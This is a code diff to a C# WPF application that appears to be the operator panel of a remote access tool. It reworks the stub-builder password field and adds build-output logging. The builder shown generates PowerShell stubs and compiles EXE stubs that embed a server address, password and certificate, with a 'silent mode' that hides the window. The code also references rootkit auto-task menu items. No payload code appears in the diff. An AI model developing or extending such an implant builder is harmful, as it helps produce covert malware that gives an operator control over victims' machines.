@@ -35,7 +35,8 @@ namespace WpfApp
     public partial class MainWindow : Window
     {
         private bool _pwSyncing;
-        private TextBox _builderPwReveal;
+        private string _builderActualPassword = "";
+        private bool _builderPwHidden = true;
         private TextBox _httpPwReveal;
         private TcpServer _tcpServer;
 
@@ -145,9 +146,9 @@ namespace WpfApp
             _pluginHost = new PluginHost(this);
             _pluginManager = new PluginManager(this, _pluginHost);
 
-            builderPasswordBox.PasswordChanged += (s, e) => SyncPwToServer();
+            builderPasswordBox.TextChanged += (s, e) => SyncPwToServer();
             HttpPasswordBox.PasswordChanged += (s, e) => SyncPwToBuilder();
-            SetupPasswordReveal(builderPasswordBox, ref _builderPwReveal, "builderPwReveal");
+            SetupBuilderPasswordBox();
             SetupPasswordReveal(HttpPasswordBox, ref _httpPwReveal, "httpPwReveal");
 
             AddAutoTaskRootkitMenuItems();
@@ -157,7 +158,7 @@ namespace WpfApp
         {
             if (_pwSyncing) return;
             _pwSyncing = true;
-            HttpPasswordBox.Password = builderPasswordBox.Password;
+            HttpPasswordBox.Password = _builderActualPassword;
             _pwSyncing = false;
         }
 
@@ -165,7 +166,11 @@ namespace WpfApp
         {
             if (_pwSyncing) return;
             _pwSyncing = true;
-            builderPasswordBox.Password = HttpPasswordBox.Password;
+            _builderActualPassword = HttpPasswordBox.Password;
+            if (_builderPwHidden)
+                builderPasswordBox.Text = new string('●', _builderActualPassword.Length);
+            else
+                builderPasswordBox.Text = _builderActualPassword;
             _pwSyncing = false;
         }
 
@@ -238,6 +243,136 @@ namespace WpfApp
             parent.Children.Add(eyeBtnBorder);
         }
 
+        void SetupBuilderPasswordBox()
+        {
+            _builderPwHidden = true;
+            _builderActualPassword = "";
+
+            builderPasswordBox.PreviewTextInput += BuilderPw_PreviewTextInput;
+            builderPasswordBox.PreviewKeyDown += BuilderPw_PreviewKeyDown;
+            DataObject.AddPastingHandler(builderPasswordBox, BuilderPw_Paste);
+
+            var parent = (Grid)builderPasswordBox.Parent;
+            int col = Grid.GetColumn(builderPasswordBox);
+
+            var brdrBrush = (SolidColorBrush)Application.Current.Resources["BorderBrush"];
+            var txtDimBrush = (SolidColorBrush)Application.Current.Resources["TextSecondaryBrush"];
+            var sfLightBrush = (SolidColorBrush)Application.Current.Resources["SurfaceLightBrush"];
+
+            var eyeBtnBorder = new Border
+            {
+                Width = 36,
+                Height = 36,
+                CornerRadius = new CornerRadius(6),
+                Background = Brushes.Transparent,
+                BorderBrush = brdrBrush,
+                BorderThickness = new Thickness(1),
+                VerticalAlignment = VerticalAlignment.Center,
+                Margin = new Thickness(6, 0, 0, 0)
+            };
+
+            var eyeBtn = new System.Windows.Controls.Primitives.ToggleButton
+            {
+                Content = "👁",
+                VerticalAlignment = VerticalAlignment.Center,
+                HorizontalAlignment = HorizontalAlignment.Center,
+                IsChecked = false,
+                Background = Brushes.Transparent,
+                BorderThickness = new Thickness(0),
+                Cursor = Cursors.Hand,
+                ToolTip = "Show/hide password",
+                Foreground = txtDimBrush
+            };
+
+            eyeBtnBorder.Child = eyeBtn;
+
+            eyeBtn.Checked += (s, e) =>
+            {
+                _builderPwHidden = false;
+                builderPasswordBox.Text = _builderActualPassword;
+            };
+            eyeBtn.Unchecked += (s, e) =>
+            {
+                _builderPwHidden = true;
+                builderPasswordBox.Text = new string('●', _builderActualPassword.Length);
+            };
+            eyeBtn.MouseEnter += (s, e) => { eyeBtnBorder.Background = sfLightBrush; eyeBtnBorder.BorderBrush = txtDimBrush; };
+            eyeBtn.MouseLeave += (s, e) => { eyeBtnBorder.Background = Brushes.Transparent; eyeBtnBorder.BorderBrush = brdrBrush; };
+
+            Grid.SetColumn(eyeBtnBorder, col + 1);
+            parent.Children.Add(eyeBtnBorder);
+
+            builderPasswordBox.Text = new string('●', _builderActualPassword.Length);
+        }
+
+        void BuilderPw_PreviewTextInput(object sender, TextCompositionEventArgs e)
+        {
+            if (!_builderPwHidden) return;
+            var tb = (TextBox)sender;
+            int start = tb.SelectionStart;
+            int selLen = tb.SelectionLength;
+            _builderActualPassword = _builderActualPassword.Remove(start, selLen).Insert(start, e.Text);
+            tb.Text = new string('●', _builderActualPassword.Length);
+            tb.CaretIndex = start + e.Text.Length;
+            e.Handled = true;
+        }
+
+        void BuilderPw_PreviewKeyDown(object sender, KeyEventArgs e)
+        {
+            if (!_builderPwHidden) return;
+            var tb = (TextBox)sender;
+            int start = tb.SelectionStart;
+            int selLen = tb.SelectionLength;
+            if (e.Key == Key.Back)
+            {
+                if (selLen > 0)
+                {
+                    _builderActualPassword = _builderActualPassword.Remove(start, selLen);
+                    tb.Text = new string('●', _builderActualPassword.Length);
+                    tb.CaretIndex = start;
+                }
+                else if (start > 0)
+                {
+                    _builderActualPassword = _builderActualPassword.Remove(start - 1, 1);
+                    tb.Text = new string('●', _builderActualPassword.Length);
+                    tb.CaretIndex = start - 1;
+                }
+                e.Handled = true;
+            }
+            else if (e.Key == Key.Delete)
+            {
+                if (selLen > 0)
+                {
+                    _builderActualPassword = _builderActualPassword.Remove(start, selLen);
+                    tb.Text = new string('●', _builderActualPassword.Length);
+                    tb.CaretIndex = start;
+                }
+                else if (start < _builderActualPassword.Length)
+                {
+                    _builderActualPassword = _builderActualPassword.Remove(start, 1);
+                    tb.Text = new string('●', _builderActualPassword.Length);
+                    tb.CaretIndex = start;
+                }
+                e.Handled = true;
+            }
+        }
+
+        void BuilderPw_Paste(object sender, DataObjectPastingEventArgs e)
+        {
+            if (!_builderPwHidden) return;
+            if (e.DataObject.GetDataPresent(DataFormats.Text))
+            {
+                var tb = (TextBox)sender;
+                string text = (string)e.DataObject.GetData(DataFormats.Text);
+                int start = tb.SelectionStart;
+                int selLen = tb.SelectionLength;
+                _builderActualPassword = _builderActualPassword.Remove(start, selLen).Insert(start, text);
+                tb.Text = new string('●', _builderActualPassword.Length);
+                tb.CaretIndex = start + text.Length;
+            }
+            e.Handled = true;
+        }
+
         // ==================== LOG LEVELS ====================
 
         public void AppendVerboseLog(string message)
@@ -274,7 +409,7 @@ namespace WpfApp
                                 builderIpTextBox.Text = settings.ServerIp;
 
                     if (!string.IsNullOrWhiteSpace(settings.Password))
-                        builderPasswordBox.Password = settings.Password;
+                        _builderActualPassword = settings.Password;
 
                     builderSilentCheckBox.IsChecked = settings.SilentMode;
 
@@ -334,7 +469,7 @@ namespace WpfApp
                     settings.EncryptionKey = builderEncryptionKeyTextBox.Text;
                     settings.Port = builderPortTextBox.Text;
                     settings.ServerIp = builderIpTextBox.Text;
-                    settings.Password = builderPasswordBox.Password;
+                    settings.Password = _builderActualPassword;
                     settings.ListenPort = listenportTextBox.Text;
                     settings.ServerPassword = HttpPasswordBox.Password;
                     settings.Theme = ThemeManager.CurrentTheme;
@@ -1922,8 +2057,8 @@ namespace WpfApp
                 if (string.IsNullOrWhiteSpace(listenportTextBox.Text) && !string.IsNullOrWhiteSpace(builderPortTextBox.Text))
                     listenportTextBox.Text = builderPortTextBox.Text;
 
-                if (string.IsNullOrWhiteSpace(HttpPasswordBox.Password) && !string.IsNullOrWhiteSpace(builderPasswordBox.Password))
-                    HttpPasswordBox.Password = builderPasswordBox.Password;
+                if (string.IsNullOrWhiteSpace(HttpPasswordBox.Password) && !string.IsNullOrWhiteSpace(_builderActualPassword))
+                    HttpPasswordBox.Password = _builderActualPassword;
             }
 
             if (e.AddedItems.Count > 0 && e.AddedItems[0] == networkTab)
@@ -2849,6 +2984,7 @@ namespace WpfApp
         private void BuilderGenerateButton_Click(object sender, RoutedEventArgs e)
         {
             UpdateStatus("Generating stub...");
+            builderOutputTextBox.Text = "Ready to generate stub...";
 
             string port = builderPortTextBox.Text.Trim();
             string password = HttpPasswordBox.Password.Trim();
@@ -2857,6 +2993,7 @@ namespace WpfApp
 
             if (!ValidateBuilderInputs())
             {
+                BuilderOutput("ERROR: Validation failed — check inputs");
                 UpdateStatus("Stub generation failed.");
                 return;
             }
@@ -2864,16 +3001,18 @@ namespace WpfApp
             SaveSettings();
 
             bool silentMode = builderSilentCheckBox?.IsChecked == true;
+            BuilderOutput($"Generating PS1 stub — {serverIp}:{port} (silent={silentMode})");
+
             string stubCode = GenerateStubCode(port, password, serverIp, encKey, silentMode);
 
             if (stubCode.StartsWith("# Template"))
             {
+                BuilderOutput("ERROR: Stub generation failed — template not found");
                 UpdateStatus("Stub generation failed.");
                 return;
             }
 
-            builderOutputTextBox.Text =
-                $"Generated stub:\n  Server: {serverIp}:{port}\n\nReady to save.";
+            BuilderOutput($"Stub generated ({stubCode.Length} chars)");
 
             var dialog = new SaveFileDialog
             {
@@ -2886,11 +3025,12 @@ namespace WpfApp
             {
                 File.WriteAllText(dialog.FileName, stubCode);
                 AppendLog($"Stub saved to {dialog.FileName}");
-                builderOutputTextBox.Text += $"\n\nSaved: {dialog.FileName}";
+                BuilderOutput($"Saved: {dialog.FileName}");
                 UpdateStatus("Stub generated and saved.");
             }
             else
             {
+                BuilderOutput("Save cancelled.");
                 UpdateStatus("Stub generated (not saved).");
             }
         }
@@ -2898,9 +3038,11 @@ namespace WpfApp
         private async void CompileExeButton_Click(object sender, RoutedEventArgs e)
         {
             UpdateStatus("Compiling EXE...");
+            builderOutputTextBox.Text = "Ready to generate stub...";
 
             if (!ValidateBuilderInputs())
             {
+                BuilderOutput("ERROR: Validation failed — check inputs");
                 UpdateStatus("EXE compilation failed.");
                 return;
             }
@@ -2910,6 +3052,7 @@ namespace WpfApp
             if (_serverCertificate == null)
             {
                 AppendLog("ERROR: Server certificate not loaded. Set up a certificate first.");
+                BuilderOutput("ERROR: Server certificate not loaded. Set up a certificate first.");
                 UpdateStatus("EXE compilation failed.");
                 return;
             }
@@ -2920,10 +3063,13 @@ namespace WpfApp
             if (string.IsNullOrEmpty(stubCode))
             {
                 AppendLog("ERROR: C# stub template not found.");
+                BuilderOutput("ERROR: C# stub template not found.");
                 UpdateStatus("EXE compilation failed.");
                 return;
             }
 
+            BuilderOutput($"Compiling EXE stub — {builderIpTextBox.Text.Trim()}:{builderPortTextBox.Text.Trim()}");
+            BuilderOutput($"Silent mode: {silentMode}");
             AppendLog($"Replacing placeholders: SILENT_MODE={silentMode}");
 
             string certBase64 = Convert.ToBase64String(
@@ -2938,12 +3084,14 @@ namespace WpfApp
             if (stubCode.Contains("{{SILENT_MODE}}"))
             {
                 AppendLog("ERROR: SILENT_MODE placeholder was not replaced.");
+                BuilderOutput("ERROR: SILENT_MODE placeholder was not replaced.");
                 UpdateStatus("EXE compilation failed.");
                 return;
             }
             if (stubCode.Contains("{{SERVER_URL}}") || stubCode.Contains("{{CERTIFICATE}}") || stubCode.Contains("{{SILENT_MODE}}") || stubCode.Contains("{{PASSWORD}}"))
             {
                 AppendLog("ERROR: Some placeholders were not replaced.");
+                BuilderOutput("ERROR: Some placeholders were not replaced.");
                 UpdateStatus("EXE compilation failed.");
                 return;
             }
@@ -2957,7 +3105,24 @@ namespace WpfApp
             if (saveDialog.ShowDialog() == true)
                 await CompileToExe(stubCode, saveDialog.FileName, silentMode);
             else
+            {
+                BuilderOutput("Save cancelled.");
                 UpdateStatus("EXE compilation cancelled.");
+            }
+        }
+
+        private void BuilderOutput(string message)
+        {
+            Dispatcher.Invoke(() =>
+            {
+                string timestamp = DateTime.Now.ToString("HH:mm:ss");
+                string current = builderOutputTextBox.Text;
+                if (current == "Ready to generate stub...")
+                    builderOutputTextBox.Text = $"[{timestamp}] {message}";
+                else
+                    builderOutputTextBox.Text = $"{current}\n[{timestamp}] {message}";
+                builderOutputTextBox.ScrollToEnd();
+            });
         }
 
         private bool ValidateBuilderInputs()
@@ -2965,18 +3130,21 @@ namespace WpfApp
             if (!int.TryParse(builderPortTextBox.Text.Trim(), out int port) || port <= 0 || port > 65535)
             {
                 AppendLog("ERROR: Enter a valid port (1-65535).");
+                BuilderOutput("ERROR: Enter a valid port (1-65535).");
                 return false;
             }
 
             if (string.IsNullOrWhiteSpace(HttpPasswordBox.Password) || HttpPasswordBox.Password.Length < 12)
             {
                 AppendLog("ERROR: Server password must be at least 12 characters. Set it in Settings tab.");
+                BuilderOutput("ERROR: Server password must be at least 12 characters. Set it in Settings tab.");
                 return false;
             }
 
             if (string.IsNullOrWhiteSpace(builderIpTextBox.Text))
             {
                 AppendLog("ERROR: Server IP is required.");
+                BuilderOutput("ERROR: Server IP is required.");
                 return false;
             }
 
@@ -3068,19 +3236,29 @@ namespace WpfApp
         {
             try
             {
+                Dispatcher.Invoke(() => builderOutputTextBox.Text = "Ready to generate stub...");
+
                 if (!IsDotnetSdkAvailable())
                 {
                     AppendLog("ERROR: .NET SDK not found. Install from https://dotnet.microsoft.com/download");
+                    BuilderOutput("ERROR: .NET SDK not found. Install from https://dotnet.microsoft.com/download");
                     UpdateStatus("EXE compilation failed — .NET SDK required.");
                     return;
                 }
 
                 AppendLog("Creating temporary build project...");
+                BuilderOutput("Creating temporary build project...");
 
                 if (silentMode)
+                {
                     AppendLog("Silent mode enabled — stub will run with no visible window.");
+                    BuilderOutput("Silent mode enabled — stub will run with no visible window.");
+                }
                 else
+                {
                     AppendLog("Normal mode — stub will show a console window.");
+                    BuilderOutput("Normal mode — stub will show a console window.");
+                }
 
                 string buildDir = Path.Combine(
                     Path.GetTempPath(),
@@ -3121,6 +3299,10 @@ namespace WpfApp
                     AppendLog($"Build directory: {buildDir}");
                     AppendLog($"Output type: {outputType} ({(silentMode ? "silent" : "console visible")})");
                     AppendLog("Compiling with: dotnet build (targeting .NET Framework 4.7.2)");
+                    BuilderOutput($"Build directory: {buildDir}");
+                    BuilderOutput($"Output type: {outputType}");
+                    BuilderOutput("Compiling with: dotnet build (targeting .NET Framework 4.7.2)");
+                    BuilderOutput("─" + new string('─', 60));
 
                     string publishDir = Path.Combine(buildDir, "out");
 
@@ -3146,7 +3328,11 @@ namespace WpfApp
                         {
                             stdout.AppendLine(args.Data);
                             string line = args.Data;
-                            Dispatcher.BeginInvoke(() => AppendLog($"  [build] {line}"));
+                            Dispatcher.BeginInvoke(() => {
+                                AppendLog($"  [build] {line}");
+                                if (!string.IsNullOrWhiteSpace(line))
+                                    BuilderOutput($"  {line}");
+                            });
                         }
                     };
 
@@ -3156,7 +3342,11 @@ namespace WpfApp
                         {
                             stderr.AppendLine(args.Data);
                             string line = args.Data;
-                            Dispatcher.BeginInvoke(() => AppendLog($"  [build-err] {line}"));
+                            Dispatcher.BeginInvoke(() => {
+                                AppendLog($"  [build-err] {line}");
+                                if (!string.IsNullOrWhiteSpace(line))
+                                    BuilderOutput($"  [ERR] {line}");
+                            });
                         }
                     };
 
@@ -3170,22 +3360,30 @@ namespace WpfApp
                     {
                         try { process.Kill(); } catch { }
                         AppendLog("ERROR: Build timed out after 120 seconds.");
+                        BuilderOutput("ERROR: Build timed out after 120 seconds.");
                         UpdateStatus("EXE compilation timed out.");
                         return;
                     }
 
                     if (process.ExitCode != 0)
                     {
+                        BuilderOutput("─" + new string('─', 60));
                         AppendLog($"ERROR: Build failed with exit code {process.ExitCode}");
+                        BuilderOutput($"ERROR: Build failed with exit code {process.ExitCode}");
                         if (stderr.Length > 0)
                         {
                             AppendLog("Build errors:");
+                            BuilderOutput("Build errors:");
                             foreach (string line in stderr.ToString().Split('\n').Take(30))
                             {
                                 if (!string.IsNullOrWhiteSpace(line))
+                                {
                                     AppendLog($"  {line.Trim()}");
+                                    BuilderOutput($"  {line.Trim()}");
+                                }
                             }
                         }
+                        BuilderOutput("─" + new string('─', 60));
                         UpdateStatus("EXE compilation failed.");
                         return;
                     }
@@ -3202,8 +3400,12 @@ namespace WpfApp
                         else
                         {
                             AppendLog("ERROR: Build succeeded but no .exe found in output directory.");
+                            BuilderOutput("ERROR: Build succeeded but no .exe found in output directory.");
                             foreach (string f in Directory.GetFiles(publishDir, "*.*", SearchOption.AllDirectories))
+                            {
                                 AppendLog($"  {Path.GetFileName(f)}");
+                                BuilderOutput($"  {Path.GetFileName(f)}");
+                            }
                             UpdateStatus("EXE compilation failed.");
                             return;
                         }
@@ -3216,10 +3418,15 @@ namespace WpfApp
                         ? $"{fileSize / 1024.0:F1} KB"
                         : $"{fileSize / (1024.0 * 1024.0):F1} MB";
 
+                    BuilderOutput("─" + new string('─', 60));
                     AppendLog($"EXE compiled successfully: {outputPath}");
+                    BuilderOutput($"EXE compiled successfully: {outputPath}");
                     AppendLog($"Size: {fileSizeStr}");
+                    BuilderOutput($"Size: {fileSizeStr}");
                     AppendLog($"Mode: {(silentMode ? "Silent (no window)" : "Normal (console visible)")}");
+                    BuilderOutput($"Mode: {(silentMode ? "Silent (no window)" : "Normal (console visible)")}");
                     AppendLog("Target: .NET Framework 4.7.2");
+                    BuilderOutput("Target: .NET Framework 4.7.2");
                     UpdateStatus($"EXE compiled successfully ({(silentMode ? "silent" : "normal")}).");
                 }
                 finally
@@ -3239,8 +3446,13 @@ namespace WpfApp
             catch (Exception ex)
             {
                 AppendLog($"Compilation error: {ex.Message}");
+                BuilderOutput($"Compilation error: {ex.Message}");
                 if (ex.InnerException != null)
+                {
                     AppendLog($"Inner: {ex.InnerException.Message}");
+                    BuilderOutput($"Inner: {ex.InnerException.Message}");
+                }
+                BuilderOutput("─" + new string('─', 60));
                 UpdateStatus("EXE compilation failed.");
             }
         }
